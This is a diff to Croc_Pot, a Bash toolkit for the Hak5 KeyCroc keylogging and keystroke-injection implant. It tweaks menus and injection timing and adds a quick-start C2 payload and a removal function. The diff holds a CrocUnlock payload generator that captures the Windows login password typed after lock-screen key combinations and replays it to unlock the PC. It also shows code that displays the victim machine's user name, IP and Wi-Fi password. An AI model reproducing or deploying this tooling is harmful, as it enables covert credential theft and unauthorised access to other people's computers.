@@ -4,7 +4,7 @@
 # Title:         Croc_Pot 
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.2
+# Version:       1.2.1
 # Category:      Key Croc
 ##
 
@@ -93,7 +93,7 @@ function croc_title() {
 \e[40;31m${LINE_A}${clear}\e[40m>${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m5${clear}\e[40m<${clear}\e[40;31m${LINE_A}${clear}\e[40m${yellow}KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)           ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m                    ${clear}\e[40m${yellow}KeyCroc VER: $(cat /root/udisk/version.txt)                ${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}     ${clear}\e[40m${yellow}KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)     ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m>CROC_POT<\e[40;31m${LINE_A}    ${clear}\e[40m${yellow}VER: 1.2 CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp).C             ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m>CROC_POT<\e[40;31m${LINE_A}    ${clear}\e[40m${yellow}VER: 1.2.1 CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp).C           ${clear}
 \e[41;30m${LINE}${clear}\n\n"	
 }
 
@@ -837,7 +837,7 @@ croc_unlock_p() {
 	CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40mINSTALLING PAYLOAD CALLED CROCUNLOCK TO PAYLOAD FOLDER${red}${LINE_}${clear}\n"
     echo -ne "$(Info_Screen '
--Start by pressing GUI + L or CONTROL + ALT or ALT + F4\n
+-Start by pressing GUI + L or CONTROL + ALT + DELETE\n
 -This will forus the user to enter password and save to keycroc\n
 -This will create another payload called Croc_unlock_2.txt\n
 -Next time at login screen type in crocunlock\n
@@ -852,7 +852,7 @@ echo -ne "\n\e[40m$(ColorRed '
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
 	LED SETUP
-	echo -e "# Title:           CrocUnlock (payload #1)\n# Description:     Log into windows pc\n# Author:          spywill / RootJunky\n# Version:         1.3\n# Category:        Key Croc\n#\n#\nMATCH (GUI-l|CONTROL-ALT-DELETE|ALT-F4)\n#\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\nCROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\n#" >> ${CROCUNLOCK}
+	echo -e "# Title:           CrocUnlock (payload #1)\n# Description:     Log into windows pc\n# Author:          spywill / RootJunky\n# Version:         1.3\n# Category:        Key Croc\n#\n#\nMATCH (GUI-l|CONTROL-ALT-DELETE)\n#\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\nCROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\n#" >> ${CROCUNLOCK}
 	echo -e "if [ -e \"\${CROC_UNLOCK}\" ]; then\n     LED ATTACK\n     sleep 2\nSAVEKEYS /root/udisk/loot/Croc_Pot/Croc_unlock.txt UNTIL ENTER\n     LED FINISH\n     sleep 2\n     LED OFF;\nelse\n     LED SETUP" >> ${CROCUNLOCK}
 	printf '%s\n'     'echo -e "# Title:           CrocUnlock (PAYLOAD #2)\n# Description:     Log into windows pc\n# Author:          RootJunky / Spywill\n# Version:         1.3\n# Category:        Key Croc\n#\n#" >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
 	printf '%s\n'     'echo M\A\T\C\H crocunlock >> ${CROC_UNLOCK}' >> ${CROCUNLOCK}
@@ -983,7 +983,6 @@ fi
 ##
 
 function croc_vpn() {
-	clear
 	vpn_file_A=/etc/openvpn/*.ovpn
 	vpn_file=/root/udisk/*.ovpn
 	echo -ne "$(Info_Screen '
@@ -3941,7 +3940,7 @@ $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
 $(ColorYellow 'Pc user name is:') $(sed -n 1p ${croc_os_v})
 $(ColorYellow 'Pc IP is:') $(sed -n 2p ${croc_os_v})
 $(ColorYellow 'Pc SSID + PASSWD and MAC address is:') 
-$(sed '3,9!d' ${croc_os_v})\n"
+$(sed '3,14!d' ${croc_os_v})\n"
 else
     echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')"
  fi
@@ -4287,6 +4286,7 @@ fi
 pine_web() {
 	echo -ne "\n\e[40m$(ColorYellow 'Starting WIFI Pineapple web page')\n${clear}"
 	CROC_OS=/root/udisk/loot/Croc_OS.txt
+	OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4296,16 +4296,16 @@ pine_web() {
 	   sleep 2
 	   Q STRING "Start-Process http://172.16.42.1:1471"
 	   Q ENTER
-	   Q ENTER
 	   sleep 3
 	   Q ALT-TAB
-	   sleep 1
-	   Q ALT-F4
+	   sleep 2
+	   Q STRING "exit"
+	   Q ENTER
 else
     HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi) 
-                      Q CONTROL-ALT-d
+                      Q GUI d
                       sleep 1
                       Q STRING "terminal"
                       Q ENTER
@@ -4456,6 +4456,7 @@ ssh_bunny() {
 	   pw_list
 	fi
 	   CROC_OS=/root/udisk/loot/Croc_OS.txt
+	   OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4469,7 +4470,7 @@ else
     HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi) 
-                      Q CONTROL-ALT-d
+                      Q GUI d
                       sleep 1
                       Q STRING "terminal"
                       Q ENTER
@@ -4579,6 +4580,7 @@ fi
 hak_factory() {
 	echo -ne "\n\e[40m$(ColorYellow 'Open Hak5 factory recovery web page')\n${clear}"
 	CROC_OS=/root/udisk/loot/Croc_OS.txt
+	OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4588,19 +4590,27 @@ hak_factory() {
 	   sleep 2
 	   Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
 	   Q ENTER
+	   sleep 5
+	   Q ALT-TAB
+	   sleep 1
+	   Q STRING "exit"
 	   Q ENTER
 else
     HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi) 
-                      Q CONTROL-ALT-d
+                      Q GUI d
                       sleep 1
                       Q STRING "terminal"
                       Q ENTER
                       Q ENTER
                       sleep 1
                       Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-                      Q ENTER;;
+                      Q ENTER
+                      sleep 5
+                      Q ALT-TAB
+                      sleep 1
+                      Q ALT-F4;;
                 parrot)
                       Q ALT F2
                       sleep 1
@@ -4608,7 +4618,11 @@ else
                       Q ENTER
                       sleep 1
                       Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-                      Q ENTER;;
+                      Q ENTER
+                      sleep 5
+                      Q ALT-TAB
+                      sleep 1
+                      Q ALT-F4;;
                      *)
                       Q ALT F2
                       sleep 1
@@ -4616,7 +4630,11 @@ else
                       Q ENTER
                       sleep 1
                       Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-                      Q ENTER;;                      
+                      Q ENTER
+                      sleep 5
+                      Q ALT-TAB
+                      sleep 1
+                      Q ALT-F4;;                      
 esac
 fi
 }
@@ -4675,18 +4693,45 @@ locale_en_US() {
 esac
 	
 }
+
+##
+#   - Remove Croc_Pot and all contents
+##
+
+remove_croc_pot() {
+	echo -ne "\n$(Info_Screen '
+--This will completely remove Croc_Pot from the KeyCroc\n
+--An all its contents\n')${clear}\n\n"
+    echo -ne "\e[40m$(ColorRed 'ARE YOU SURE YOU WANT TO REMOVE CROCPOT TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read CROC_POT_REMOVE
+    case $CROC_POT_REMOVE in
+  [yY] | [yY][eE][sS] )	
+	apt -y remove unzip openvpn sshpass
+	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
+	rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
+	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
+	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
+	rm /root/udisk/payloads/Getonline.txt /root/udisk/payloads/Quick_Start_C2.txt
+	rm /root/udisk/loot/Croc_OS.txt /root/udisk/loot/Croc_OS_ip.txt
+	rm /root/udisk/tools/Croc_Pot.sh 
+	exit 0 ;;
+  [nN] | [nN][oO] )
+    echo -e "\n\e[40m$(ColorYellow 'Return Back to main menu')${clear} "
+    main_menu ;;
+esac
+}
 	
 ##
 #   - recovery menu
 ##
 
 MenuTitle KEYCROC RECOVERY MENU
-MenuColor 1 DOWNLOAD LATEST FIRMWARE ; echo -ne " ${clear}\n"
-MenuColor 2 FACTORY RESET HOW TO ; echo -ne "      ${clear}\n"
-MenuColor 3 RESTORE LASTEST FIRMWARE ; echo -ne " ${clear}\n"
-MenuColor 4 REMOVE LASTEST FIRMWARE ; echo -ne "  ${clear}\n"
-MenuColor 5 REPAIR en_US.UTF-8 ERROR ; echo -ne " ${clear}\n"
-MenuColor 6 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
+MenuColor 1 DOWNLOAD LATEST FIRMWARE ; echo -ne "  ${clear}\n"
+MenuColor 2 FACTORY RESET HOW TO ; echo -ne "       ${clear}\n"
+MenuColor 3 RESTORE LASTEST FIRMWARE ; echo -ne "  ${clear}\n"
+MenuColor 4 REMOVE LASTEST FIRMWARE ; echo -ne "   ${clear}\n"
+MenuColor 5 REPAIR en_US.UTF-8 ERROR ; echo -ne "  ${clear}\n"
+MenuColor 6 REMOVE CROC_POT AN CONTENTS ; echo -ne "${clear}\n"
+MenuColor 7 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
 MenuEnd
     read c_f
     case $c_f in
@@ -4695,7 +4740,8 @@ MenuEnd
 	3) restore_firmware ; croc_recovery ;;
 	4) echo -ne "\n$(ColorYellow 'Removing lastest firmware file from tools folder')\n" ; rm /root/udisk/tools/kc_fw_1.3_510.tar.gz ; croc_recovery ;;
 	5) locale_en_US ; croc_recovery ;;
-	6) main_menu ;;
+	6) remove_croc_pot ;;
+	7) main_menu ;;
 	0) exit 0 ;;
 	*) invalid_entry ; croc_recovery ;;
 	esac
@@ -4773,6 +4819,7 @@ ExecStart=/usr/local/bin/c2-3.1.2_armv7_linux -hostname $(ifconfig wlan0 | grep 
 start_web() {
 
 	CROC_OS=/root/udisk/loot/Croc_OS.txt
+	OS_CHECK=$(sed -n 1p ${CROC_OS})
 	if [ "${OS_CHECK}" = WINDOWS ]; then
 	   Q GUI d
 	   Q GUI r
@@ -4782,16 +4829,16 @@ start_web() {
 	   sleep 2
 	   Q STRING "Start-Process http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	   Q ENTER
-	   Q ENTER
-	   sleep 3
+	   sleep 5
 	   Q ALT-TAB
-	   sleep 1
-	   Q ALT-F4
+	   sleep 2
+	   Q STRING "exit"
+	   Q ENTER
 else
     HOST_CHECK=$(sed -n 3p ${CROC_OS})
       case $HOST_CHECK in
            raspberrypi) 
-                      Q CONTROL-ALT-d
+                      Q GUI d
                       sleep 1
                       Q STRING "terminal"
                       Q ENTER
@@ -4799,7 +4846,7 @@ else
                       sleep 1
                       Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
                       Q ENTER
-                      sleep 3
+                      sleep 5
                       Q ALT-TAB
                       sleep 1
                       Q ALT-F4;;
@@ -4811,7 +4858,7 @@ else
                       sleep 1
                       Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
                       Q ENTER
-                      sleep 3
+                      sleep 5
                       Q ALT-TAB
                       sleep 1
                       Q ALT-F4;;
@@ -4823,7 +4870,7 @@ else
                       sleep 1
                       Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
                       Q ENTER
-                      sleep 3
+                      sleep 5
                       Q ALT-TAB
                       sleep 1
                       Q ALT-F4;;                      
@@ -4843,7 +4890,36 @@ remove_cloud() {
 	rm /usr/local/bin/c2-3.1.2_armv7_linux
 	rm /etc/systemd/system/hak5.service
 }
-MenuTitle HAK5 C2 MENU
+
+##
+#   - Quick start Cloud_C2 payload function
+##
+
+quick_cloud() {
+	quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
+	clear
+	echo -ne "$(Info_Screen '
+-Will need to install Cloud C2 frist
+-This will install Quick_Start_C2.txt in the payload folder\n
+-Use this to start C2 for a payload\n
+-Type in startc2 this will automatically start C2\n')${clear}\n"
+    if [ -e ${quickcloud} ]; then
+    echo -ne "\n\e[40m$(ColorGreen 'Quick_Start_C2.txt already exist check payloads folder\n')"
+else
+    echo -ne "MATCH startc2\nCROC_OS=/root/udisk/loot/Croc_OS.txt\nif [ -e \${CROC_OS} ]; then\nLED G\nsystemctl restart hak5.service
+sleep 5\nOS_CHECK=\$(sed -n 1p \${CROC_OS})\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\nQ GUI d\nQ GUI r\nsleep 1\nQ STRING \"powershell\"
+Q ENTER\nsleep 2\nQ STRING \"Start-Process http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
+Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 2\nQ STRING \"exit\"\nQ ENTER\nelse\nHOST_CHECK=\$(sed -n 3p \${CROC_OS})\ncase \$HOST_CHECK in
+raspberrypi)\nQ GUI d\nsleep 1\nQ STRING \"terminal\"\nQ ENTER\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
+Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nparrot)\nQ ALT F2\nsleep 1\nQ STRING \"mate-terminal\"\nQ ENTER\nsleep 1
+Q STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\nQ ENTER\nsleep 5\nQ ALT-TAB
+sleep 1\nQ ALT-F4;;\n*)\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
+Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nesac\nfi\nelse\nLED G\nsystemctl restart hak5.service\nsleep 5\nfi" >> ${quickcloud}
+    echo -ne "\n\e[40m$(ColorGreen 'Quick_Start_C2.txt is now installed check payloads folder\n')"
+fi	
+}
+
+MenuTitle HAK5 CLOUD C2 MENU
 MenuColor 1 HAK5 C2 SETUP ; echo -ne "     ${clear}\n"
 MenuColor 2 START HAK5 C2 ; echo -ne "     ${clear}\n"
 MenuColor 3 RELOAD HAK5 C2 ; echo -ne "    ${clear}\n"
@@ -4851,7 +4927,8 @@ MenuColor 4 RESTART HAK5 C2 ; echo -ne "   ${clear}\n"
 MenuColor 5 STOP HAK5 C2 ; echo -ne "      ${clear}\n"
 MenuColor 6 REMOVE HAK5 C2 ; echo -ne "    ${clear}\n"
 MenuColor 7 EDIT HAK5 C2 ; echo -ne "      ${clear}\n"
-MenuColor 8 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
+MenuColor 8 QUICK START C2 ; echo -ne "    ${clear}\n"
+MenuColor 9 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
 MenuEnd
         read H_C
         case $H_C in
@@ -4862,7 +4939,8 @@ MenuEnd
         5) systemctl stop hak5.service ; hak_cloud ;;
         6) remove_cloud ; hak_cloud ;;
         7) nano /etc/systemd/system/hak5.service ; hak_cloud ;;
-        8) main_menu ;;
+        8) quick_cloud ; hak_cloud ;;
+        9) main_menu ;;
         0) exit 0 ;;
         *) invalid_entry ; hak_cloud ;;
         esac
@@ -4886,7 +4964,7 @@ MenuColor 5 KEYCROC EDIT ; echo -ne "  ${clear}\n"
 MenuColor 6 SSH MENU ; echo -ne "      ${clear}\n"
 MenuColor 7 KEYCROC UPDATE ; echo -ne "${clear}\n"
 MenuColor 8 RECOVERY MENU ; echo -ne " ${clear}\n"
-MenuColor 9 HAK5 C2 ; echo -ne "       ${clear}\n"
+MenuColor 9 HAK5 CLOUD C2 ; echo -ne "  ${clear}\n"
 MenuEnd
     read a
     case $a in
